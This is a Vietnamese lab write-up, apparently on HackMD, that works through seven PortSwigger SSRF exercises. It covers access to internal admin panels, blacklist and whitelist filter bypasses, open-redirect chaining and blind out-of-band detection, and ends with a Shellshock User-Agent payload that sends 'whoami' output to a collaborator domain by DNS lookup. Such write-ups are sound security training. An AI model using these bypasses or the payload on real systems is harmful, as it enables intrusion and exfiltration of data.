# Lab 1: Basic SSRF against the local server
![image](https://hackmd.io/_uploads/rJcJPTWST.png)
Lab này có tính năng kiểm tra hàng tồn kho để lấy dữ liệu từ hệ thống nội bộ.
![image](https://hackmd.io/_uploads/BJddFaZrT.png)

Nó thực hiện điều này bằng cách chuyển đến back-end API endpoint thông qua front-end HTTP request.
![image](https://hackmd.io/_uploads/Hy4ctTZSa.png)
Hệ thống nhận `stockApi` là url (tin tưởng là local rồi) nên trả về số lượng hàng tồn kho như yêu cầu

Ta sẽ khai thác lỗ hổng này để truy cập `/admin` như sau
![image](https://hackmd.io/_uploads/Bk1rnpbHT.png)

Cuối cùng là xóa `carlos`
![image](https://hackmd.io/_uploads/By4j2pZS6.png)
![image](https://hackmd.io/_uploads/SyW626-HT.png)
![image](https://hackmd.io/_uploads/Byd6nTbHa.png)

# Lab 2: Basic SSRF against another back-end system
![image](https://hackmd.io/_uploads/B1mdeAbST.png)

Lab này chỉ cho phép truy cập thông qua IP riêng của nó
![image](https://hackmd.io/_uploads/SJgb-AbrT.png)

Lab đã cung cấp IP:`192.168.0.X`, port: `8080`. Giờ ta sẽ brute-force IP
![image](https://hackmd.io/_uploads/SJy7fAbHT.png)
![image](https://hackmd.io/_uploads/HkgBz0WST.png)

Status 200 và trả về admin, vậy ta tìm được IP là `192.168.0.193`
![image](https://hackmd.io/_uploads/SkhwzRWrT.png)
![image](https://hackmd.io/_uploads/Hky1mRZST.png)
![image](https://hackmd.io/_uploads/rkYWQAWSp.png)
![image](https://hackmd.io/_uploads/BJ17QCbHa.png)

# Lab 3: SSRF with blacklist-based input filter
![image](https://hackmd.io/_uploads/ry_br0-rT.png)

Hệ thống chặn một số hostname như `localhost, 127.0.0.1`
![image](https://hackmd.io/_uploads/rk6urCZS6.png)
![image](https://hackmd.io/_uploads/HkchB0-H6.png)

Bypass bằng cách thay thế bằng `127.1`
![image](https://hackmd.io/_uploads/BJny8CbBp.png)

Tuy nhiên, `/admin` cũng bị chặn 
![image](https://hackmd.io/_uploads/rJd5UAZS6.png)

Sửa thành `/Admin` thì truy cập thành công rùi
![image](https://hackmd.io/_uploads/SyK0UAWSa.png)
![image](https://hackmd.io/_uploads/HJqbvA-Sa.png)
![image](https://hackmd.io/_uploads/SJXMD0ZHp.png)

# Lab 4: SSRF with whitelist-based input filter
![image](https://hackmd.io/_uploads/BJqAPR-B6.png)

Lab này cũng bị lọc hostname, chỉ cho phép `stock.weliketoshop.net`
![image](https://hackmd.io/_uploads/rksDuRWBa.png)

Bypass:
- Sử dụng ký tự @
![image](https://hackmd.io/_uploads/B1ebcCWSp.png)
- Dùng # kết hợp với @
![image](https://hackmd.io/_uploads/BJZz5AZr6.png)
- Encode 2 lần # 
![image](https://hackmd.io/_uploads/Sy4E5RbBp.png)
![image](https://hackmd.io/_uploads/r1x85CZH6.png)
![image](https://hackmd.io/_uploads/BJaI5AbH6.png)

# Lab 5: SSRF with filter bypass via open redirection vulnerability
![image](https://hackmd.io/_uploads/Sy0RhAWB6.png)
![image](https://hackmd.io/_uploads/rkaZl1MBa.png)
Ở lab này, sau khi click vào next product để check stock của sản phẩm tiếp theo ta bắt được request
![image](https://hackmd.io/_uploads/HyQ1CRWHp.png)
Hệ thống được chuyển hướng đến `/product?productId=2`

Ta sẽ khai thác qua tham số `stockApi`
![image](https://hackmd.io/_uploads/S1_jg1frT.png)
Có vẻ hệ thống nghĩ chúng ta đang truyền cả 2 `stockApi` và `path` (path là tham số trong url)

Mã hóa `&` thì chuyển hướng đến product 2 thành công
![image](https://hackmd.io/_uploads/ryKObJGr6.png)

Giờ thì chuyển hướng đến `/admin` thui
![image](https://hackmd.io/_uploads/BkQi-kfH6.png)
![image](https://hackmd.io/_uploads/S1fZG1MSp.png)
![image](https://hackmd.io/_uploads/BJs-MJzST.png)

# Lab 6: Blind SSRF with out-of-band detection
![image](https://hackmd.io/_uploads/rkHbVJGr6.png)
Lab này chứa lỗ hổng blind SSRF.

Request khi xem product 1
![image](https://hackmd.io/_uploads/ByVYSyGST.png)
Header `Referer` chứa URL của trang được truy cập trước khi chúng ta truy cập đến `/product?productId=1`

Thay đổi giá trị header `Referer` thành địa chỉ tới domain Burp Collaborator.
![image](https://hackmd.io/_uploads/Sy53IyfH6.png)
DNS lookup thành công do đó tại header `Referer` có khả năng bị tấn công SSRF.
![image](https://hackmd.io/_uploads/B1eGePyMHT.png)

# Lab 7: Blind SSRF with Shellshock exploitation
![image](https://hackmd.io/_uploads/BJzGD1GHT.png)
- Web sử dụng phần mềm phân tích tìm nạp URL được chỉ định trong header Referer
- Server nội bộ `192.168.0.X`, port `8080`dễ bị Shellshock tấn công
- Mục tiêu lab
    - Tìm server nội bộ
    - Payload shellshock để lấy tên hệ điều hành user

Sử dụng Collaborator Everywhere để kiểm tra
![image](https://hackmd.io/_uploads/HJWh1efSp.png)
`User-Agent` và `Referer` dễ bị tấn công

Cú pháp lệnh [shellshock](https://blog.cloudflare.com/inside-shellshock/) đối với `User-Agent`
```
() { ignored;};arbitrary command
```
Payload:
```
() { ignored;};/usr/bin/nslookup $(whoami).4kpu4owshnnq4ir8voacea1w4nagy6mv.oastify.com
```
Ta phải brute-force địa chỉ IP nữa
![image](https://hackmd.io/_uploads/SJrIgxMrp.png)
![image](https://hackmd.io/_uploads/BkuwlgzST.png)

Xảy xa DNS lookup và nhận được OS user name `peter-rCO0tv`
![image](https://hackmd.io/_uploads/BJxpleMra.png)

Submit
![image](https://hackmd.io/_uploads/B1N4WlMH6.png)


